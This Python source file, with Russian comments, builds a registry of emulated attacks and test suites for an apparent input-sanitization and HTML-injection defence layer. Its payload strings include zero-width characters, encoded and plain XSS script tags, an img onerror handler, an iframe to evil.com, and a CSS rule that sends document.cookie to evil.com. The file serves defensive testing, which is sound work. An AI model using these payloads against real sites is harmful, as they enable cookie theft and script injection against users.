from __future__ import annotations

from typing import Any

from ...l1.infrastructure import (
    ZeroWidthAttackEmulator,
    EncodingAttackEmulator,
    LengthLimitAttackEmulator,
    UnicodeNormalizationAttackEmulator,
)
from .adapters import L1AttackEmulatorAdapter, LegacyL1EmulatorAdapter
from .attack_registry import AttackRegistry
from .html_injection_emulator import HTMLInjectionEmulator, AdvancedHTMLInjectionEmulator
from ..domain.entities import AttackDefinition, AttackCategory


def setup_attack_registry() -> AttackRegistry:
    """Настроить реестр атак с предустановленными эмуляторами."""
    registry = AttackRegistry()

    # Интегрируем L1 эмуляторы
    _register_l1_emulators(registry)

    # Интегрируем HTML injection эмуляторы
    _register_html_emulators(registry)

    return registry


def _register_l1_emulators(registry: AttackRegistry) -> None:
    """Зарегистрировать L1 эмуляторы атак."""
    # Создаем L1 эмуляторы
    l1_config = None  # Можно передать реальную конфигурацию

    zero_width_emulator = ZeroWidthAttackEmulator(l1_config)
    encoding_emulator = EncodingAttackEmulator(l1_config)
    length_emulator = LengthLimitAttackEmulator(l1_config)
    unicode_emulator = UnicodeNormalizationAttackEmulator(l1_config)

    # Регистрируем атаки L1
    l1_attacks = [
        AttackDefinition(
            id="l1_zero_width_injection",
            name="Zero-width character injection",
            description="Injection of zero-width characters to bypass sanitization",
            category=AttackCategory.L1_INPUT_SANITIZATION,
            payload="\u200b\u200c\u200d\u200e\u200f",
            target_layer="l1",
            expected_success=False,
        ),
        AttackDefinition(
            id="l1_unicode_normalization",
            name="Unicode normalization attack",
            description="Using Unicode normalization to bypass filters",
            category=AttackCategory.L1_INPUT_SANITIZATION,
            payload="ñ",  # ñ - normalized form
            target_layer="l1",
            expected_success=False,
        ),
        AttackDefinition(
            id="l1_encoding_attack",
            name="Encoding attack",
            description="Using different encodings to bypass detection",
            category=AttackCategory.L1_INPUT_SANITIZATION,
            payload="%3Cscript%3Ealert%281%29%3C%2Fscript%3E",  # URL encoded
            target_layer="l1",
            expected_success=False,
        ),
        AttackDefinition(
            id="l1_length_limit_attack",
            name="Length limit attack",
            description="Exceeding input length limits",
            category=AttackCategory.L1_INPUT_SANITIZATION,
            payload="x" * 6000,  # Very long string
            target_layer="l1",
            expected_success=False,
        ),
    ]

    # Регистрируем определения атак и эмуляторы
    for attack in l1_attacks:
        registry.register_attack_definition(attack)

        # Выбираем подходящий эмулятор на основе типа атаки
        if "zero_width" in attack.id:
            adapter = L1AttackEmulatorAdapter(zero_width_emulator, l1_config)
        elif "unicode" in attack.id:
            adapter = L1AttackEmulatorAdapter(unicode_emulator, l1_config)
        elif "encoding" in attack.id:
            adapter = L1AttackEmulatorAdapter(encoding_emulator, l1_config)
        elif "length" in attack.id:
            adapter = L1AttackEmulatorAdapter(length_emulator, l1_config)
        else:
            # Fallback
            adapter = LegacyL1EmulatorAdapter(ZeroWidthAttackEmulator, l1_config)

        registry.register_emulator(attack.id, adapter)


def _register_html_emulators(registry: AttackRegistry) -> None:
    """Зарегистрировать HTML injection эмуляторы."""
    # HTML injection атаки
    html_attacks = [
        AttackDefinition(
            id="html_script_injection",
            name="Script tag injection",
            description="Injecting <script> tags to execute JavaScript",
            category=AttackCategory.HTML_INJECTION,
            payload="<script>alert('XSS')</script>",
            target_layer="l3",
            expected_success=False,
        ),
        AttackDefinition(
            id="html_iframe_injection",
            name="Iframe injection",
            description="Injecting <iframe> tags for content spoofing",
            category=AttackCategory.HTML_INJECTION,
            payload="<iframe src='http://evil.com'></iframe>",
            target_layer="l3",
            expected_success=False,
        ),
        AttackDefinition(
            id="html_event_handler_injection",
            name="Event handler injection",
            description="Injecting JavaScript in HTML event handlers",
            category=AttackCategory.HTML_INJECTION,
            payload="<img src='x' onerror='alert(1)'>",
            target_layer="l3",
            expected_success=False,
        ),
        AttackDefinition(
            id="html_css_injection",
            name="CSS injection",
            description="Injecting malicious CSS",
            category=AttackCategory.HTML_INJECTION,
            payload="<style>body { background: url('http://evil.com/log?cookie='+document.cookie); }</style>",
            target_layer="l3",
            expected_success=False,
        ),
        AttackDefinition(
            id="html_encoded_injection",
            name="HTML encoded injection",
            description="Using HTML entities to bypass filters",
            category=AttackCategory.HTML_INJECTION,
            payload="<script>alert('XSS')</script>",
            target_layer="l3",
            expected_success=False,
        ),
    ]

    # Создаем эмуляторы
    basic_html_emulator = HTMLInjectionEmulator()
    advanced_html_emulator = AdvancedHTMLInjectionEmulator()

    # Регистрируем атаки и эмуляторы
    for attack in html_attacks:
        registry.register_attack_definition(attack)

        # Используем продвинутый эмулятор для всех HTML атак
        registry.register_emulator(attack.id, advanced_html_emulator)


def create_attack_suite_from_config(config: dict[str, Any]) -> Any:
    """Создать набор атак из конфигурации."""
    from ..domain.entities import AttackSuite

    attacks = []
    for attack_config in config.get("attacks", []):
        attack = AttackDefinition(**attack_config)
        attacks.append(attack)

    return AttackSuite(
        id=config["id"],
        name=config["name"],
        description=config.get("description", ""),
        target_layer=config["target_layer"],
        attacks=attacks,
        metadata=config.get("metadata", {}),
    )


def create_default_attack_suites() -> list[Any]:
    """Создать стандартные наборы атак для каждого слоя."""
    suites = []

    # L1 suite
    l1_suite = {
        "id": "l1_comprehensive_test",
        "name": "L1 Comprehensive Test Suite",
        "description": "Complete test suite for L1 input sanitization layer",
        "target_layer": "l1",
        "attacks": [
            {
                "id": "l1_zero_width_injection",
                "name": "Zero-width character injection",
                "description": "Injection of zero-width characters",
                "category": "l1_input_sanitization",
                "payload": "\u200b\u200c\u200d\u200e\u200f",
                "target_layer": "l1",
                "expected_success": False,
            },
            {
                "id": "l1_unicode_attack",
                "name": "Unicode normalization attack",
                "description": "Unicode normalization bypass",
                "category": "l1_input_sanitization",
                "payload": "ñ",
                "target_layer": "l1",
                "expected_success": False,
            },
        ],
    }

    # L3 suite
    l3_suite = {
        "id": "l3_html_injection_test",
        "name": "L3 HTML Injection Test Suite",
        "description": "Test suite for L3 context firewall HTML injection protection",
        "target_layer": "l3",
        "attacks": [
            {
                "id": "html_script_injection",
                "name": "Script injection",
                "description": "JavaScript injection via script tags",
                "category": "html_injection",
                "payload": "<script>alert('XSS')</script>",
                "target_layer": "l3",
                "expected_success": False,
            },
            {
                "id": "html_iframe_injection",
                "name": "Iframe injection",
                "description": "Content spoofing via iframe",
                "category": "html_injection",
                "payload": "<iframe src='http://evil.com'></iframe>",
                "target_layer": "l3",
                "expected_success": False,
            },
        ],
    }

    suites.append(create_attack_suite_from_config(l1_suite))
    suites.append(create_attack_suite_from_config(l3_suite))

    return suites